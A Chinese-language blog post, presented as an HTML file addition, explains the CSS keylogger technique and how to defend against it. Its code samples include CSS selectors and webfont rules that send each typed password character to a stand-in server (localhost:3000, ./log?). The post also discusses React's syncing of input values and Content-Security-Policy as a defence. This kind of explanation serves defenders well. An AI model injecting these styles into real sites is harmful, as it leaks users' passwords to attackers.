@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="zh-tw">
+<head>
+    <meta charset="utf-8">
+<title>CSS keylogger：攻擊與防禦 - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2018/03/12/en/css-keylogger/" rel="alternate" hreflang="en" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2018/03/12/css-keylogger/">
+    
+
+
+
+
+
+    <meta name="description" content="前言前陣子在 Hacker News 上面看到這篇：Show HN: A CSS Keylogger，大開眼界，決定要找個時間好好來研究一下，並且寫一篇文章分享給大家。 這篇會講到以下東西：  什麼是 keylogger CSS keylogger 的原理 CSS keylogger 與 React 防禦方法  好，那就讓我們開始吧！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSS keylogger：攻擊與防禦">
+<meta property="og:url" content="https://blog.huli.tw/2018/03/12/css-keylogger/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="前言前陣子在 Hacker News 上面看到這篇：Show HN: A CSS Keylogger，大開眼界，決定要找個時間好好來研究一下，並且寫一篇文章分享給大家。 這篇會講到以下東西：  什麼是 keylogger CSS keylogger 的原理 CSS keylogger 與 React 防禦方法  好，那就讓我們開始吧！">
+<meta property="og:locale" content="zh_TW">
+<meta property="article:published_time" content="2018-03-12T14:10:00.000Z">
+<meta property="article:modified_time" content="2023-05-07T01:15:16.477Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Front-end">
+<meta property="article:tag" content="CSS">
+<meta name="twitter:card" content="summary_large_image">
+
+
+
+<link rel="alternative" href="/atom.xml" title="CSS keylogger：攻擊與防禦" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=3.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">文章列表</a>
+            
+            <a class="navbar-item "
+               href="/categories">分類</a>
+            
+            <a class="navbar-item "
+               href="/recommend">推薦閱讀</a>
+            
+            <a class="navbar-item "
+               href="/about">關於我</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="目錄">
+                    目錄
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#前言">1&nbsp;&nbsp;<b>前言</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#keylogger-是什麼">2&nbsp;&nbsp;<b>Keylogger 是什麼？</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#純-css-keylogger-的原理">3&nbsp;&nbsp;<b>純 CSS keylogger 的原理</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#css-keylogger-的限制">4&nbsp;&nbsp;<b>CSS keylogger 的限制</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#不能保證順序">4.1&nbsp;&nbsp;不能保證順序</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#重複字元不會送出-request">4.2&nbsp;&nbsp;重複字元不會送出 Request</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#在輸入的時候其實-value-不會變">4.3&nbsp;&nbsp;在輸入的時候，其實 value 不會變</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#react-的回應">4.4&nbsp;&nbsp;React 的回應</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#防禦方法">4.5&nbsp;&nbsp;防禦方法</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#總結">4.6&nbsp;&nbsp;總結</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#參考資料">5&nbsp;&nbsp;<b>參考資料</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
+                
+                <i class="fab fa-medium"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+                <a class="navbar-item" href="/2018/03/12/en/css-keylogger/">English</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        最近開了一個讀者回饋表單，無論是對文章的感想或是對部落格的感想，有什麼想回饋的都可以填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            CSS keylogger：攻擊與防禦
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2018-03-12T14:10:00.000Z" itemprop="datePublished">2018年3月12日</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/Front-end/">Front-end</a>
+        </span>
+        
+        
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <h1><span id="前言">前言</span></h1><p>前陣子在 Hacker News 上面看到這篇：<a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=16422696">Show HN: A CSS Keylogger</a>，大開眼界，決定要找個時間好好來研究一下，並且寫一篇文章分享給大家。</p>
+<p>這篇會講到以下東西：</p>
+<ol>
+<li>什麼是 keylogger</li>
+<li>CSS keylogger 的原理</li>
+<li>CSS keylogger 與 React</li>
+<li>防禦方法</li>
+</ol>
+<p>好，那就讓我們開始吧！</p>
+<span id="more"></span>
+
+<h1><span id="keylogger-是什麼">Keylogger 是什麼？</span></h1><p>Keylogger 就是鍵盤側錄，是惡意程式的一種，拿來記錄你電腦上面所有按過的按鍵。還記得我小時候曾經用 VB6 寫了一個超簡單的 keylogger，只要呼叫系統提供的 API 並且記錄相對應的按鍵就好。</p>
+<p>在電腦上面被裝這個的話，就等於你輸入的任何東西都被記錄起來。當然，也包含了帳號跟密碼。不過如果我沒記錯，防毒軟體的行為偵測應該可以把這些都擋掉，所以也不用太過擔心。</p>
+<p>剛剛講的是在電腦上面，現在我們把範圍縮小，侷限在網頁。</p>
+<p>如果你要在頁面上加一個 keylogger，通常會利用 JavaScript 來達成，而且程式碼超級簡單：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'keydown'</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>key<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>只要偵測<code>keydown</code>事件並且抓出按下的 key 就行了。</p>
+<p>不過假如你有能力在你想入侵的網頁上面加入 JavaScript 的話，通常也不需要這麼麻煩去記錄每個按鍵，你直接把 Cookie 偷走、竄改頁面、導到釣魚頁面，或者是在 submit 的時候把帳號密碼回傳給自己的 Server 就好，所以 keylogger 顯得不是那麼有用。</p>
+<p>好，那假設我們現在沒辦法插入惡意的 JavaScript，只能改 CSS，有辦法用純 CSS 做出一個 keylogger 嗎？</p>
+<p>有，畢竟 CSS 能做的事情<a target="_blank" rel="noopener" href="https://github.com/you-dont-need/You-Dont-Need-JavaScript">可多了</a>。</p>
+<h1><span id="純-css-keylogger-的原理">純 CSS keylogger 的原理</span></h1><p>直接看程式碼你就懂了（取自：<a target="_blank" rel="noopener" href="https://github.com/maxchehab/CSS-Keylogging">maxchehab&#x2F;CSS-Keylogging</a>）：</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">input[type="password"][value$="a"]</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"http://localhost:3000/a"</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>神奇吧！</p>
+<p>如果你不熟悉 CSS selector，這邊幫你複習一下。上面那段意思就是說如果 type 是 password 的 input，value 以 a 結尾的話，背景圖就載入<code>http://localhost:3000/a</code> 。</p>
+<p>現在我們可以把這串 CSS 改一下，新增大小寫英文字母、數字甚至是特殊符號，接著會發生什麼事呢？</p>
+<p>如果我輸入 abc123，瀏覽器就會發送 Request 到：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="http://localhost:3000/a">http://localhost:3000/a</a></li>
+<li><a target="_blank" rel="noopener" href="http://localhost:3000/b">http://localhost:3000/b</a></li>
+<li><a target="_blank" rel="noopener" href="http://localhost:3000/c">http://localhost:3000/c</a></li>
+<li><a target="_blank" rel="noopener" href="http://localhost:3000/1">http://localhost:3000/1</a></li>
+<li><a target="_blank" rel="noopener" href="http://localhost:3000/2">http://localhost:3000/2</a></li>
+<li><a target="_blank" rel="noopener" href="http://localhost:3000/3">http://localhost:3000/3</a></li>
+</ol>
+<p>就這樣，你的密碼就完全被攻擊者給掌握了。</p>
+<p>這就是 CSS keylogger 的原理，利用 CSS Selector 搭配載入不同的網址，就能夠把密碼的每一個字元發送到 Server 去。</p>
+<p>看起來很可怕對吧，別怕，其實沒那麼容易。</p>
+<h1><span id="css-keylogger-的限制">CSS keylogger 的限制</span></h1><h2><span id="不能保證順序">不能保證順序</span></h2><p>雖然你輸入的時候是按照順序輸入的，但 Request 抵達後端的時候並不能保證順序，所以有時候順序會亂掉。例如說 abc123 變成 bca213 之類的。</p>
+<p>但如果我們把 CSS Selector 改一下的話，其實就能解決這個問題：</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">input[value^="a"]</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"http://localhost:3000/a_"</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+  
+<span class="token selector">input[value*="aa"]</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"http://localhost:3000/aa"</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+  
+<span class="token selector">input[value*="ab"]</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"http://localhost:3000/ab"</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如果開頭是 a，我們就送出<code>a_</code>，接著針對 26 個字母跟數字的排列組合每兩個字元送出一個 request，例如說：abc123，就會是：</p>
+<ol>
+<li>a_</li>
+<li>ab</li>
+<li>bc</li>
+<li>c1</li>
+<li>12</li>
+<li>23</li>
+</ol>
+<p>就算順序亂掉，透過這種關係你把字母重新組合起來，還是可以得到正確的密碼順序。</p>
+<h2><span id="重複字元不會送出-request">重複字元不會送出 Request</span></h2><p>因為載入的網址一樣，所以重複的字元就不會再載入圖片，不會發送新的 Request。這個問題目前據我所知應該是解不掉。</p>
+<h2><span id="在輸入的時候其實-value-不會變">在輸入的時候，其實 value 不會變</span></h2><p>這個其實是 CSS Keylogger 最大的問題。</p>
+<p>當你在 input 輸入資訊的時候，其實 input 的 value 是不會變的，所以上面講的那些完全不管用。你可以自己試試看就知道了，input 的內容會變，但是你用 dev tool 看的話，會發現 value 完全不會變。</p>
+<p>針對這個問題，有兩個解決方案，第一個是利用 Webfont：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>css keylogger<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
+<span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> x<span class="token punctuation">;</span> <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>./log?a<span class="token punctuation">)</span></span><span class="token punctuation">,</span> <span class="token function">local</span><span class="token punctuation">(</span>Impact<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+61<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+<span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> x<span class="token punctuation">;</span> <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>./log?b<span class="token punctuation">)</span></span><span class="token punctuation">,</span> <span class="token function">local</span><span class="token punctuation">(</span>Impact<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+62<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+<span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> x<span class="token punctuation">;</span> <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>./log?c<span class="token punctuation">)</span></span><span class="token punctuation">,</span> <span class="token function">local</span><span class="token punctuation">(</span>Impact<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+63<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+<span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> x<span class="token punctuation">;</span> <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>./log?d<span class="token punctuation">)</span></span><span class="token punctuation">,</span> <span class="token function">local</span><span class="token punctuation">(</span>Impact<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+64<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+<span class="token selector">input</span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> x<span class="token punctuation">,</span> <span class="token string">'Comic sans ms'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>a<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>type `bcd` and watch network log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>（程式碼取自：<a target="_blank" rel="noopener" href="https://github.com/jbtronics/CrookedStyleSheets/issues/24">Keylogger using webfont with single character unicode-range</a>）</p>
+<p>value 不會跟著變又怎樣，字體總會用到了吧！只要每打一個字，就會送出相對應的 Request。</p>
+<p>但這個方法的侷限有兩個：</p>
+<ol>
+<li>沒辦法保證順序，一樣也沒辦法解決重複字元的問題</li>
+<li>如果欄位是<code>&lt;input type=&#39;password&#39; /&gt;</code>，就沒有用</li>
+</ol>
+<p>（在研究第二個侷限的時候發現一件有趣的事，由於 Chrome 跟 Firefox 會把「頁面上有 type 是 password 的 input，但是又沒用 HTTPS」的網站標示為不安全，所以有人研究出用<a target="_blank" rel="noopener" href="https://www.troyhunt.com/bypassing-browser-security-warnings-with-pseudo-password-fields/">普通 input 搭配特殊字體</a>來躲過這個偵測，並且讓輸入框看起來像是 password（但其實 type 不是 password），在這種情形下就可以用 Webfont 來攻擊了）</p>
+<p>再來我們看第二種解決方案，剛剛有說到這個問題的癥結點在於 value 不會變，換句話說，如果你 input 輸入值的時候，value 會跟著變的話，這個攻擊手法就很用了。</p>
+<p>嗯…有沒有一種很熟悉的感覺。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">NameForm</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">props</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+  
+    <span class="token keyword">this</span><span class="token punctuation">.</span>handleChange <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleChange</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  
+  <span class="token function">handleChange</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">value</span><span class="token operator">:</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  
+  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span>
+      <span class="token operator">&lt;</span>form<span class="token operator">></span>
+        <span class="token operator">&lt;</span>label<span class="token operator">></span>
+          <span class="token literal-property property">Name</span><span class="token operator">:</span>
+          <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> value<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span> onChange<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleChange<span class="token punctuation">&#125;</span> <span class="token operator">/</span><span class="token operator">></span>
+        <span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">></span>
+      <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>（以上程式碼改寫自<a target="_blank" rel="noopener" href="https://reactjs.org/docs/forms.html">React 官網</a>）</p>
+<p>如果你用過 React 的話，應該會很熟悉這個模式。你在輸入任何東西的時候，會先改變 state，再把 state 的值對應到 input 的 value 去。因此你輸入什麼，value 就會是什麼。</p>
+<p>React 是超夯的前端 Library，可以想像有一大堆網頁都是用 React 做的，而且只要是 React，幾乎就能保證 input 的 value 一定會同步更新（幾乎啦，但應該還是有少數沒有遵循這個規則）。</p>
+<p>在這邊先做個總結，只要你 input 的 value 會對應到裡面的值（假如你用 React，幾乎一定會這樣寫），並且有地方可以讓別人塞入自訂的 CSS 的話，就能成功實作出 CSS Keylogger。雖然有些缺陷（沒辦法偵測重複字元），但概念上是可行的，只是精準度沒那麼高。</p>
+<h2><span id="react-的回應">React 的回應</span></h2><p>React 的社群也有針對這一個問題進行討論，都在 <a target="_blank" rel="noopener" href="https://github.com/facebook/react/issues/11896">Stop syncing value attribute for controlled inputs #11896</a> 這個 Issue 裡。</p>
+<p>事實上，讓 input 的 value 跟輸入的值同步這件事情一直都會有一些 bug，以前甚至發生了知名流量分析網站 Mixpanel <a target="_blank" rel="noopener" href="https://www.reddit.com/r/analytics/comments/7ukw4n/mixpanel_js_library_has_been_harvesting_passwords/">不小心記錄敏感資訊的事件</a>，而最根本的原因就是因為 React 會一直同步更新 value。</p>
+<p>Issue 的討論滿值得一看的，裡面有提到大家常搞混的一件事情：Input 的 attributes 跟 properties。我找到 Stackover flow 上面一篇不錯的解釋：<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/6003819/what-is-the-difference-between-properties-and-attributes-in-html">What is the difference between properties and attributes in HTML?</a></p>
+<p>attributes 基本上就是你 HTML 上面的那個東西，而 properties 代表的是實際的 value，兩個不一定會相等，舉例來說：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>the-input<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Name:<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>假如你今天抓這個 input 的 attribute，你會得到<code>Name:</code>，但如果你今天抓 input 的 value，你會得到目前在輸入框裡面的值。所以其實這個 attribute 就跟我們常用的 <code>defaultValue</code> 是一樣的意思，就是預設值。</p>
+<p>不過在 React 裡面，他會把 attribute 跟 value 同步，所以你 value 是什麼，attribute 就會是什麼。</p>
+<p>從討論看起來，在 React 17 滿有機會把這個機制拿掉，讓這兩者不再同步。</p>
+<h2><span id="防禦方法">防禦方法</span></h2><p>上面講了這麼多，因為現今 React 還沒把這個改掉，所以問題還是存在著。而且其實除了 React，也可能有別的 Library 做了差不多的事情。</p>
+<p>Client 端的防禦方法我就不提了，基本就是裝一些別人寫好的 Chrome Extension，可以幫你偵測符合模式的 CSS 之類的，這邊比較值得提的是 Server 端的防禦。</p>
+<p>目前看起來最一勞永逸的解決方案就是 Content-Security-Policy，簡而言之它是一個 HTTP Response 的 header，用來決定瀏覽器可以載入哪些資源，例如說禁止 inline 程式碼、只能載入同個 domain 下的資源之類的。</p>
+<p>這個 Header 的初衷就是為了防止 XSS 以及攻擊者載入外部的惡意程式碼（例如說我們這個 CSS keylogger）。想知道更詳細的用法可以參考這篇：<a target="_blank" rel="noopener" href="https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/">Content-Security-Policy - HTTP Headers 的資安議題 (2)</a></p>
+<h2><span id="總結">總結</span></h2><p>不得不說，這個手法真的很有趣！之前第一次看到的時候也驚嘆了好一陣子，居然能發現這樣子的純 CSS Keylogger。雖然技術上是可行的，但在實作上還是會碰到許多困難之處，而且要符合滿多前提才能做這樣子的攻擊，不過還是很值得關注後續的發展。</p>
+<p>總之呢，這篇文就是想介紹這個東西給讀者們，希望大家有所收穫。</p>
+<h1><span id="參考資料">參考資料</span></h1><ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/jbtronics/CrookedStyleSheets/issues/24">Keylogger using webfont with single character unicode-range #24</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/facebook/react/issues/11896">Stop syncing value attribute for controlled inputs #11896</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/maxchehab/CSS-Keylogging">maxchehab&#x2F;CSS-Keylogging</a></li>
+<li><a target="_blank" rel="noopener" href="https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/">Content-Security-Policy - HTTP Headers 的資安議題 (2)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense">Stealing Data With CSS: Attack and Defense</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.troyhunt.com/bypassing-browser-security-warnings-with-pseudo-password-fields/">Bypassing Browser Security Warnings with Pseudo Password Fields</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.bram.us/2018/02/21/css-keylogger-and-why-you-shouldnt-worry-about-it/">CSS Keylogger (and why you shouldn’t worry about it)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.reddit.com/r/analytics/comments/7ukw4n/mixpanel_js_library_has_been_harvesting_passwords/">Mixpanel JS library has been harvesting passwords </a></li>
+</ol>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Front-end/">#Front-end</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/CSS/">#CSS</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
